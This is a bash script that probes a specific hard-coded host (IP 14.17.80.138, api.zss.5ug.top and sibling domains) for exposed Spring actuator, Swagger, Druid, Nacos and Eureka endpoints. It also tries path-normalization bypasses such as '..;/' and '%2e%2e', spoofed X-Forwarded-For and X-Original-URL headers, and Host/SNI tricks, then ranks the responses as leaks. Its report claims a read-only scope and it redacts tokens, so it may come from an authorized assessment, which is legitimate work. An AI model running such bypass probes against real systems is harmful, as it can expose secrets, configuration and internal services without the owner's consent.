#!/usr/bin/env bash
set -o pipefail

TOKEN="${TOKEN:-}"
TARGET_IP="${TARGET_IP:-14.17.80.138}"
API_HOST="${API_HOST:-api.zss.5ug.top}"
OUT_ROOT="${OUT_ROOT:-security_probes/out}"
STAMP="$(date '+%Y%m%d-%H%M%S')"
OUT_DIR="$OUT_ROOT/upstream-entry-$STAMP"
REPORT="$OUT_DIR/report.md"
ERRLOG="$OUT_DIR/curl-errors.log"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-5}"
MAX_TIME="${MAX_TIME:-12}"

mkdir -p "$OUT_DIR/bodies" "$OUT_DIR/headers"

AUTH_ARGS=()
if [ -n "$TOKEN" ]; then
  case "$TOKEN" in
    Bearer\ *|bearer\ *) AUTH_ARGS=(-H "Authorization: $TOKEN") ;;
    *) AUTH_ARGS=(-H "Authorization: Bearer $TOKEN") ;;
  esac
fi

CURL_BASE=(-k -sS --connect-timeout "$CONNECT_TIMEOUT" --max-time "$MAX_TIME" -H "Tenant: master")

sanitize_name() {
  printf '%s' "$1" | sed -E 's#^[a-zA-Z]+://##; s#[^A-Za-z0-9._-]+#_#g; s#_+$##' | cut -c1-180
}

redact_file() {
  local file="$1"
  [ -f "$file" ] || return 0
  perl -0777 -i -pe '
    s/(Authorization:\s*Bearer\s+)[A-Za-z0-9._-]+/${1}<redacted>/gi;
    s/("token"\s*:\s*")[^"]+/${1}<redacted>/gi;
    s/("satoken"\s*:\s*")[^"]+/${1}<redacted>/gi;
    s/("mobile"\s*:\s*")[^"]+/${1}<redacted>/gi;
    s/("email"\s*:\s*")[^"]+/${1}<redacted>/gi;
    s/(satoken=)[^;\s]+/${1}<redacted>/gi;
  ' "$file"
}

header_value() {
  local header_file="$1"
  local name="$2"
  tr -d '\r' < "$header_file" | awk -v n="$name" 'tolower($1)==tolower(n)":" {print substr($0, index($0,$2)); exit}'
}

body_summary() {
  local body="$1"
  if [ ! -s "$body" ]; then
    printf 'empty'
    return
  fi
  perl -0777 -ne '
    my $s=$_;
    $s =~ s/\s+/ /g;
    $s =~ s/\|/ /g;
    $s =~ s/`/'"'"'/g;
    print substr($s,0,220);
  ' "$body"
}

body_signal() {
  local body="$1"
  if [ ! -s "$body" ]; then
    printf 'none'
    return
  fi
  perl -0777 -ne '
    my $s=lc($_);
    my @hits;
    push @hits, "spring" if $s =~ /spring|actuator|whitelabel|gateway|eureka|nacos|druid|knife4j|swagger|openapi|tomcat|undertow|reactor|webflux/;
    push @hits, "internal-service" if $s =~ /unable to find instance|alabo-[a-z0-9_-]+|loadbalancer|service unavailable/;
    push @hits, "auth-data" if $s =~ /"success"\s*:\s*true|"code"\s*:\s*200|"user(name|code)"\s*:/;
    push @hits, "blocked" if $s =~ /forbidden|unauthorized|not found|404|403|401/;
    print @hits ? join(",", @hits) : "none";
  ' "$body"
}

probe_url() {
  local category="$1"
  local label="$2"
  local method="$3"
  local url="$4"
  shift 4
  local safe headers body meta status remote ctype length signal summary verdict
  safe="$(sanitize_name "$category-$label-$method-$url")"
  headers="$OUT_DIR/headers/$safe.headers"
  body="$OUT_DIR/bodies/$safe.body"

  status="$(curl "${CURL_BASE[@]}" "$@" -X "$method" -D "$headers" -o "$body" \
    -w '%{http_code}\t%{remote_ip}\t%{size_download}' "$url" 2>> "$ERRLOG")" || status="000\t-\t0"
  redact_file "$headers"
  redact_file "$body"

  remote="$(printf '%b' "$status" | awk -F '\t' '{print $2}')"
  length="$(printf '%b' "$status" | awk -F '\t' '{print $3}')"
  status="$(printf '%b' "$status" | awk -F '\t' '{print $1}')"
  ctype="$(header_value "$headers" content-type)"
  signal="$(body_signal "$body")"
  summary="$(body_summary "$body")"

  verdict="review"
  case "$status:$signal" in
    200:*spring*|200:*internal-service*|200:*auth-data*) verdict="interesting" ;;
    401:*|403:*|404:*) verdict="blocked-or-absent" ;;
    503:*internal-service*) verdict="gateway-route-leak" ;;
    000:*) verdict="network-error" ;;
  esac

  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$category" "$label" "$method" "$url" "$status" "$remote" "${ctype:-unknown}" "$length" "$signal" "$verdict" "$summary" >> "$OUT_DIR/probes.tsv"
}

write_report() {
  {
    echo "# Java upstream 外网进入探针"
    echo
    echo "- 时间: $(date '+%Y-%m-%d %H:%M:%S %Z')"
    echo "- 入口 IP: $TARGET_IP"
    echo "- API Host: $API_HOST"
    echo "- 边界: GET/HEAD/OPTIONS 只读验证；不上传、不执行命令、不触发任务、不中断服务"
    echo "- 认证: $([ -n "$TOKEN" ] && echo 'Bearer token 已使用，报告中不落盘 token' || echo '未提供 TOKEN')"
    echo
    echo "## 重点结果"
    echo
    echo "| 类别 | 标签 | 方法 | URL | HTTP | 信号 | 判定 | 摘要 |"
    echo "|---|---|---:|---|---:|---|---|---|"
    awk -F '\t' 'NR>1 && ($10!="blocked-or-absent" || $9!="blocked") {printf "| %s | %s | %s | `%s` | %s | %s | %s | %s |\n",$1,$2,$3,$4,$5,$9,$10,$11}' "$OUT_DIR/probes.tsv"
    echo
    echo "## 全量结果"
    echo
    echo "- TSV: \`$OUT_DIR/probes.tsv\`"
    echo "- Headers: \`$OUT_DIR/headers/\`"
    echo "- Bodies: \`$OUT_DIR/bodies/\`"
    echo "- curl errors: \`$OUT_DIR/curl-errors.log\`"
  } > "$REPORT"
}

printf 'category\tlabel\tmethod\turl\thttp\tremote\tcontent_type\tlength\tsignal\tverdict\tsummary\n' > "$OUT_DIR/probes.tsv"

API_BASE="https://$API_HOST"
RESOLVE_ARGS=(--resolve "$API_HOST:443:$TARGET_IP")

JAVA_PATHS=(
  "/actuator"
  "/actuator/"
  "/actuator/health"
  "/actuator/info"
  "/actuator/env"
  "/actuator/configprops"
  "/actuator/beans"
  "/actuator/mappings"
  "/actuator/gateway/routes"
  "/v3/api-docs"
  "/swagger-ui/index.html"
  "/swagger-ui.html"
  "/doc.html"
  "/webjars/swagger-ui/index.html"
  "/druid/index.html"
  "/druid/login.html"
  "/nacos/"
  "/nacos/v1/console/server/state"
  "/eureka/apps"
  "/error"
  "/api-docs"
  "/openapi.json"
)

for path in "${JAVA_PATHS[@]}"; do
  probe_url "java-route" "root" "GET" "$API_BASE$path" "${RESOLVE_ARGS[@]}" "${AUTH_ARGS[@]}"
  probe_url "java-route" "app-prefix" "GET" "$API_BASE/app$path" "${RESOLVE_ARGS[@]}" "${AUTH_ARGS[@]}"
done

NORMALIZE_PATHS=(
  "/app/%2e%2e/actuator/health"
  "/app/%252e%252e/actuator/health"
  "/app/..;/actuator/health"
  "/app/;/actuator/health"
  "/app//actuator/health"
  "/app/actuator%2fhealth"
  "/app/%2factuator/health"
  "/app/api/../actuator/health"
  "/app/people/user/../actuator/health"
)

for path in "${NORMALIZE_PATHS[@]}"; do
  probe_url "path-normalize" "actuator-health" "GET" "$API_BASE$path" "${RESOLVE_ARGS[@]}" "${AUTH_ARGS[@]}"
done

HEADER_PROBES=(
  "x-forwarded-for-local:-H:X-Forwarded-For: 127.0.0.1"
  "x-real-ip-local:-H:X-Real-IP: 127.0.0.1"
  "forwarded-local:-H:Forwarded: for=127.0.0.1;host=localhost;proto=https"
  "x-original-url-actuator:-H:X-Original-URL: /actuator/health"
  "x-rewrite-url-actuator:-H:X-Rewrite-URL: /actuator/health"
  "x-forwarded-prefix-root:-H:X-Forwarded-Prefix: /"
)

for item in "${HEADER_PROBES[@]}"; do
  IFS=':' read -r label hflag hvalue <<< "$item"
  probe_url "header-bypass" "$label" "GET" "$API_BASE/app/actuator/health" "${RESOLVE_ARGS[@]}" "${AUTH_ARGS[@]}" "$hflag" "$hvalue"
  probe_url "header-bypass" "$label" "GET" "$API_BASE/app/people/user/getLoginUser" "${RESOLVE_ARGS[@]}" "${AUTH_ARGS[@]}" "$hflag" "$hvalue"
done

HOSTS=(
  "$API_HOST"
  "rbf.zss.5ug.top"
  "admin.zss.5ug.top"
  "qiniu.5ug.top"
  "ace.5ug.com"
  "localhost"
  "127.0.0.1"
  "alabo-api"
  "alabo-tool"
  "alabo-gateway"
  "api"
  "gateway"
)

for host in "${HOSTS[@]}"; do
  probe_url "host-sni" "$host" "GET" "https://$host/app/people/user/getLoginUser" --resolve "$host:443:$TARGET_IP" "${AUTH_ARGS[@]}"
  probe_url "host-sni" "$host" "GET" "https://$host/actuator/health" --resolve "$host:443:$TARGET_IP" "${AUTH_ARGS[@]}"
done

DIRECT_URLS=(
  "http://$TARGET_IP/"
  "http://$TARGET_IP/app/people/user/getLoginUser"
  "http://$TARGET_IP/actuator/health"
  "https://$TARGET_IP/"
  "https://$TARGET_IP/app/people/user/getLoginUser"
  "https://$TARGET_IP/actuator/health"
)

for url in "${DIRECT_URLS[@]}"; do
  probe_url "direct-ip" "no-host" "GET" "$url" "${AUTH_ARGS[@]}"
done

write_report
printf '%s\n' "$REPORT"
